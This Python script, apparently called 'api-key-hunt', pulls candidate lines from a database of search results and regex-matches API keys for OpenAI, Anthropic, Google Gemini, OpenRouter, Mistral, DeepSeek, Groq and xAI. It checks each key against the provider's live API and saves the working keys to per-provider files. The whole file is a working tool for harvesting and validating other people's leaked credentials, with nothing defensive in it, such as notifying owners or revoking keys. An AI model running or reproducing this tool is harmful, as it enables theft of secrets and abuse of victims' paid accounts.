import sqlite3
import requests
import re
import concurrent.futures
from typing import List, Set, Dict, Any

DB_PATH = "4_api_keys.db"

# Provider Configurations

PROVIDER_CONFIGS: Dict[str, Dict[str, Any]] = {
    "openai": {
        "queries": ["%OPENAI_API_KEY%", "%OPENAI_KEY%", "%OPENAI_SECRET_KEY%", "%OPENAI_TOKEN%"],
        "patterns": [r'(sk-proj-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20})', r'(sk-[A-Za-z0-9]{48})'],
        "validation_url": "https://api.openai.com/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_openai_keys.txt",
    },
    "anthropic": {
        "queries": ["%ANTHROPIC_API_KEY%", "%CLAUDE_API_KEY%", "%ANTHROPIC_KEY%"],
        "patterns": [r'(sk-ant-api03-[A-Za-z0-9\-_]{95})', r'(sk-ant-[A-Za-z0-9\-_]{44})'],
        "validation_url": "https://api.anthropic.com/v1/messages",
        "auth_method": "x-api-key",
        "is_post": True,
        "post_data": {"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": [{"role": "user", "content": "."}]},
        "output_file": "valid_anthropic_keys.txt",
    },
    "google": {
        "queries": ["%GOOGLE_API_KEY%", "%GEMINI_API_KEY%", "%GEMINI_KEY%"],
        "patterns": [r'(AIzaSy[A-Za-z0-9\-_]{33})'],
        "validation_url": "https://generativelanguage.googleapis.com/v1beta/models",
        "auth_method": "key_param",
        "output_file": "valid_gemini_keys.txt",
    },
    "openrouter": {
        "queries": ["%OPENROUTER_API_KEY%", "%OPEN_ROUTER_API_KEY%"],
        "patterns": [r'(sk-or-v1-[a-f0-9]{64})'],
        "validation_url": "https://openrouter.ai/api/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_openrouter_keys.txt",
    },
    "mistral": {
        "queries": ["%MISTRAL_API_KEY%", "%MISTRAL_KEY%"],
        "patterns": [r'([A-Za-z0-9]{32})'], # Generic pattern, might have false positives
        "validation_url": "https://api.mistral.ai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_mistral_keys.txt",
    },
    "deepseek": {
        "queries": ["%DEEPSEEK_API_KEY%", "%DEEPSEEK_KEY%"],
        "patterns": [r'(sk-[a-f0-9]{32})'],
        "validation_url": "https://api.deepseek.com/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_deepseek_keys.txt",
    },
    "groq": {
        "queries": ["%GROQ_API_KEY%", "%GROQ_KEY%"],
        "patterns": [r'(gsk_[A-Za-z0-9]{48})'],
        "validation_url": "https://api.groq.com/openai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_groq_keys.txt",
    },
    "xai": {
        "queries": ["%XAI_API_KEY%", "%XAI_KEY%"],
        "patterns": [r'(xai-[A-Za-z0-9]{64})'],
        "validation_url": "https://api.x.ai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_xai_keys.txt",
    },
}

# Generic Functions

def get_candidates_from_db(search_queries: List[str]) -> List[str]:
    """Retrieves potential API key candidates from the database based on search queries."""
    candidates = []
    try:
        with sqlite3.connect(DB_PATH) as con:
            cur = con.cursor()
            query_placeholders = " OR ".join(["search_query LIKE ?"] * len(search_queries))
            sql_query = "SELECT matched_line FROM results WHERE " + query_placeholders  # nosec [B608]
            cur.execute(sql_query, search_queries)
            rows = cur.fetchall()
            candidates = [row[0] for row in rows if row[0]]
    except sqlite3.OperationalError as e:
        print(f"Error connecting to or reading from database: {e}")
        print(f"Please ensure the database '{DB_PATH}' exists and is not corrupted.")
    return candidates

def extract_api_keys(line: str, patterns: List[str]) -> List[str]:
    """Extracts API keys from a line of text using a list of regex patterns."""
    found_keys = []
    for pattern in patterns:
        matches = re.findall(pattern, line)
        if matches:
            found_keys.extend(matches)
    return found_keys

def is_key_valid(api_key: str, config: Dict[str, Any]) -> bool:
    """Validates an API key by making a request to the provider's API."""
    url = config["validation_url"]
    auth_method = config["auth_method"]
    headers = {"User-Agent": "api-key-hunt/1.0"}
    params = {}
    is_post = config.get("is_post", False)
    post_data = config.get("post_data", {})

    if auth_method == "bearer":
        headers["Authorization"] = f"Bearer {api_key}"
    elif auth_method == "x-api-key":
        headers["x-api-key"] = api_key
        if "anthropic" in url: # Specific header for Anthropic
            headers["anthropic-version"] = "2023-06-01"
    elif auth_method == "key_param":
        params["key"] = api_key

    try:
        if is_post:
            response = requests.post(url, headers=headers, json=post_data, params=params, timeout=10)
        else:
            response = requests.get(url, headers=headers, params=params, timeout=10)
        
        # For Anthropic, 400 on this endpoint with a valid key means bad request, but key is good.
        if config.get("is_post") and response.status_code == 400:
             print(f"  [+] VALID (via 400): {api_key[:10]}...")
             return True

        if response.status_code == 200:
            print(f"  [+] VALID: {api_key[:10]}...")
            return True
        return False
    except requests.RequestException:
        return False

def process_provider(provider_name: str, config: Dict[str, Any]):
    """Orchestrates the key validation process for a single provider."""
    print(f"\nStarting {provider_name.upper()} API key validation")
    
    candidates = get_candidates_from_db(config["queries"])
    if not candidates:
        print(f"No potential keys found in the database for {provider_name.upper()}.")
        return

    print(f"Found {len(candidates)} potential lines for {provider_name.upper()}. Extracting and validating...")
    
    extracted_keys: Set[str] = set()
    for line in candidates:
        keys = extract_api_keys(line, config["patterns"])
        for key in keys:
            extracted_keys.add(key)

    if not extracted_keys:
        print(f"Could not extract any keys from the database candidates for {provider_name.upper()}.")
        return
        
    print(f"Extracted {len(extracted_keys)} unique keys for {provider_name.upper()}. Now checking their validity...")
    output_file = config["output_file"]
    print(f"Valid {provider_name.upper()} keys will be saved to '{output_file}' as they are found.")

    with open(output_file, 'w') as f:
        pass  # Clear the file at the beginning

    valid_keys_count = 0
    for key in sorted(list(extracted_keys)):
        if is_key_valid(key, config):
            with open(output_file, 'a') as f:
                f.write(key + '\n')
            valid_keys_count += 1

    if valid_keys_count > 0:
        print(f"Found {valid_keys_count} valid {provider_name.upper()} API keys saved to '{output_file}'.")
    else:
        print(f"No valid {provider_name.upper()} API keys were found.")

def main():
    """Main function to run validation for all configured providers in parallel."""
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(PROVIDER_CONFIGS)) as executor:
        # Submit all provider processing tasks to the executor
        future_to_provider = {executor.submit(process_provider, name, config): name for name, config in PROVIDER_CONFIGS.items()}
        
        for future in concurrent.futures.as_completed(future_to_provider):
            provider_name = future_to_provider[future]
            try:
                future.result()  # Wait for the thread to complete and raise exceptions if any
            except Exception as exc:
                print(f" {provider_name.upper()} process generated an exception: {exc}")

    print("\nAll providers processed.")

if __name__ == "__main__":
    main()
